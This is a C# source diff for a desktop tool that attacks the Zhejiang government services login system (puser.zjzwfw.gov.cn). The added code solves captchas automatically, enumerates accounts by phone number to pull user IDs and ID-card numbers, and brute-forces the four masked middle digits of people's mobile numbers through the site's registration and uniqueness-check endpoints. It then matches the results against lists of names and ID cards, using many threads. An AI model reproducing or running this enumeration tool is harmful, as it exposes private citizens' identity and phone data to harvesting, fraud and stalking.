@@ -354,15 +354,175 @@ namespace 浙江号码匹配
             }
         }
 
+
+
+        string path = AppDomain.CurrentDomain.BaseDirectory;
+        /// <summary>
+        /// 根据0000-9999找回手机号，根据找回判断手机号
+        /// </summary>
+        public void run_new()
+        {
+            textBox1.Text = DateTime.Now.ToLongTimeString() + ": 开始查询";
+            cookie = method.GetCookies("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
+
+
+            try
+            {
+                StreamReader sr = new StreamReader(path+"//关键词.txt", Encoding.GetEncoding("utf-8"));
+                //一次性读取完 
+                string texts = sr.ReadToEnd();
+                string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
+                sr.Close();  //只关闭流
+                sr.Dispose();   //销毁流内存
+                for (int i = 0; i < text.Length; i++)
+                {
+
+                    try
+                    {
+                        
+                        string phone = text[i];
+                      
+                            cookie = method.GetCookies("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
+                            string yanzhengma = shibie();
+                            string url = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
+                          
+                            string postdata = "action=getUserid&loginname=" + phone + "&verifycode=" + yanzhengma;
+                            string html = PostUrl(url, postdata);
+                            while (html == "{\"result\":-1}")
+                            {
+                                textBox1.Text = DateTime.Now.ToShortTimeString() + "识别错误...";
+                                yanzhengma = shibie();
+                                postdata = "action=getUserid&loginname=" + phone + "&verifycode=" + yanzhengma;
+                                html = PostUrl(url, postdata);
+                                Thread.Sleep(100);
+                            }
+                            if (html == "{\"result\":-2}")
+                            {
+                                label1.Text = phone + "不存在";
+                                continue;
+                            }
+                            
+
+                        string userid = Regex.Match(html, @"""userid"":""([\s\S]*?)""").Groups[1].Value;
+                        string idcard = Regex.Match(html, @"""idcard"":""([\s\S]*?)""").Groups[1].Value;
+                        string loginname = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
+                        ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据   
+                        lv1.SubItems.Add(phone);
+                        lv1.SubItems.Add(userid);
+                        lv1.SubItems.Add(idcard);
+                        lv1.SubItems.Add(loginname);
+
+
+                    }
+                    catch (Exception ex)
+                    {
+                      
+                        continue;
+                    }
+
+
+
+                }
+
+            }
+            catch (Exception ex)
+            {
+
+                textBox1.Text = ex.ToString();
+            }
+        }
+
+        /// <summary>
+        /// 根据0000-9999找回手机号根据注册判断手机号
+        /// </summary>
+        public void run_register()
+        {
+            textBox1.Text = DateTime.Now.ToLongTimeString() + ": 开始查询";
+            cookie = method.GetCookies("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
+
+
+            try
+            {
+                DataTable dt = method.ExcelToDataTable(textBox4.Text, true);
+                for (int i = 0; i < dt.Rows.Count; i++)
+                {
+                    ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据   
+                    try
+                    {
+                        string name = dt.Rows[i][1].ToString().Trim();
+                        string card = dt.Rows[i][0].ToString().Trim();
+
+                        lv1.SubItems.Add(name);
+                        lv1.SubItems.Add(card);
+
+                        cookie = method.GetCookies("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
+                        for (int j = 0; j < 10000; j++)
+                        {
+                            string phone = "150" + j.ToString("D4") + "7641";
+                            // MessageBox.Show(phone);
+                           
+                            Encrypt aa = new Encrypt(getencrypt);
+                            IAsyncResult iar = BeginInvoke(aa, new object[] { phone });
+                            string phonecrypt = EndInvoke(iar).ToString();
+
+                            string url = "https://puser.zjzwfw.gov.cn/sso/newusp.do?action=loginSendMobile";
+                            string postdata = "mobilePhone=" + System.Web.HttpUtility.UrlEncode(phonecrypt);
+                            string html = PostUrl(url, postdata);
+                            string userid = Regex.Match(html, @"""userid"":""([\s\S]*?)""").Groups[1].Value;
+                          
+                            if (html.Contains("未注册"))
+                            {
+                                label1.Text = phone + "---未注册";
+                                continue;
+                            }
+                            else
+                            {
+                                textBox5.Text = html;
+                             
+                                if (html.Contains("实名用户"))
+                                {
+                                    lv1.SubItems.Add(phone);
+                                }
+                                else
+                                {
+                                    textBox5.Text += phone + "\r\n";
+                                }
+
+                            }
+                            label1.Text = phone + html;
+
+                         
+                        }
+
+
+                    }
+                    catch (Exception ex)
+                    {
+                        lv1.SubItems.Add("触发异常");
+                        continue;
+                    }
+
+
+
+                }
+
+            }
+            catch (Exception ex)
+            {
+
+                textBox1.Text = ex.ToString();
+            }
+        }
         private void button1_Click(object sender, EventArgs e)
         {
-            status = true;
-            if (thread == null || !thread.IsAlive)
-            {
-                thread = new Thread(run2);
-                thread.Start();
-                Control.CheckForIllegalCrossThreadCalls = false;
-            }
+            //status = true;
+            //if (thread == null || !thread.IsAlive)
+            //{
+            //    thread = new Thread(run_register);
+            //    thread.Start();
+            //    Control.CheckForIllegalCrossThreadCalls = false;
+            //}
+            runmain();
         }
 
         private void button4_Click(object sender, EventArgs e)
@@ -383,9 +543,174 @@ namespace 浙江号码匹配
                 zanting = false;
             }
         }
+        DataTable dt;
+        public void runmain()
+        {
+           dt = method.ExcelToDataTable(textBox4.Text, true);
+
+
+            for (int a = 0; a < dt.Rows.Count; a++)
+            {
+                string name = dt.Rows[a][0].ToString().Trim();
+                string card = dt.Rows[a][1].ToString().Trim();
+                for (int i = 0; i < 10000; i++)
+                {
+                    AddDown(name,card);
+                }
+                StartDown();
+            }
+        }
+
+
+        List<Thread> list = new List<Thread>();
+        public void AddDown(string name,string card)
+        {
+            Thread tsk = new Thread(() =>
+            {
+                download( name,card);
+            });
+            list.Add(tsk);
+        }
+        private void Change(DownMsg msg)
+        {
+            if (msg.Tag == "end")
+            {
+                StartDown(1);
+            }
+        }
+
+        public void StartDown(int StartNum = 10)
+        {
+
+            for (int i2 = 0; i2 < StartNum; i2++)
+            {
+                lock (list)
+                {
+                    for (int i = 0; i < list.Count; i++)
+                    {
+                        if (list[i].ThreadState == System.Threading.ThreadState.Unstarted || list[i].ThreadState == ThreadState.Suspended)
+                        {
+                            list[i].Start();
+                            break;
+                        }
+                    }
+                }
+            }
+
+        }
+
+        public delegate void dlgSendMsg(DownMsg msg);
+        public event dlgSendMsg doSendMsg;
+
+
+        public class DownMsg
+        {
+            public int Id;
+            public string Tag;
+            public string status;
+
+        }
+
+        Dictionary<string, string> dics = new Dictionary<string, string>();
+        private void download(string name,string card)
+        {
+            DownMsg msg = new DownMsg();
+            try
+            {
+
+                
+                try
+                {
+
+                   
+                    Encrypt aa1 = new Encrypt(getencrypt);
+                    IAsyncResult iar1 = BeginInvoke(aa1, new object[] { card });
+                    string phonecrypt1= EndInvoke(iar1).ToString();
+
+                    string url1= "https://puser.zjzwfw.gov.cn/sso/newusp.do";
+                    string postdata1= "action=checkidCardUnique&idNum=" + System.Web.HttpUtility.UrlEncode(phonecrypt1);
+                    string html1 = PostUrl(url1, postdata1);
+                    string loginname = Regex.Match(html1, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
+                    string mobilephone = Regex.Match(html1, @"""mobilephone"":""([\s\S]*?)""").Groups[1].Value;
+                    for (int i = 0; i < 10000; i++)
+                    {
+
+
+                        string phone = mobilephone.Substring(0, 3) + i.ToString("D4") + mobilephone.Substring(7, 4);
+
+                        Encrypt aa = new Encrypt(getencrypt);
+                        IAsyncResult iar = BeginInvoke(aa, new object[] { phone });
+                        string phonecrypt = EndInvoke(iar).ToString();
+
+                        string url = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
+                        string postdata = "action=regByMobile&mobilephone=" + System.Web.HttpUtility.UrlEncode(phonecrypt);
+                        string html = PostUrl(url, postdata);
+                        string username = Regex.Match(html, @"""username"":""([\s\S]*?)""").Groups[1].Value;
+                        string loginname2 = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
+                        string idcard = Regex.Match(html, @"""idcard"":""([\s\S]*?)""").Groups[1].Value;
+                        // label1.Text =id+"---->"+ html;
+                        if (html.Contains("username"))
+                        {
+                            if (loginname == loginname2 && name.Substring(name.Length - 1, 1) == username.Substring(username.Length - 1, 1) && card.Substring(card.Length - 1, 1) == idcard.Substring(idcard.Length - 1, 1))
+                            {
+                                ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
+                                lv1.SubItems.Add(card);
+                                lv1.SubItems.Add(name);
+                                lv1.SubItems.Add(phone);
+                            }
+                            else
+                            {
+                                textBox1.Text = loginname + "   " + loginname2 + "   " + name + "    " + username + "   " + phone;
+                            }
+
+                        }
+                        else
+                        {
+                            textBox1.Text = phone;
+                        }
+
+
+                        msg.Tag = "end";
+                        doSendMsg(msg);
+                    }
+
+                }
+                catch (Exception ex)
+                {
+                    textBox5.Text = ex.ToString();
+                    msg.Tag = "end";
+                    
+                }
+
+
+            }
+            catch (Exception ex)
+            {
+                textBox5.Text = ex.ToString();
+                msg.Tag = "end";
+              
+            }
+
+
+        }
+        private void SendMsgHander(DownMsg msg)
+        {
+
+            this.Invoke((MethodInvoker)delegate ()
+            {
+                listView1.Items[msg.Id].SubItems[3].Text = msg.status;
+                Application.DoEvents();
+            });
+
+
+
+        }
+
 
         private void 浙江身份号码验证_Load(object sender, EventArgs e)
         {
+            doSendMsg += Change;
+            Control.CheckForIllegalCrossThreadCalls = false;
             //WebBrowser web = new WebBrowser();
             //web.Navigate("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
            webBrowser1.Navigate("https://puser.zjzwfw.gov.cn/sso/newusp.do?action=register&servicecode=zjdsjgrbs#"); //按照姓名找回 执行加密RSA JS方法
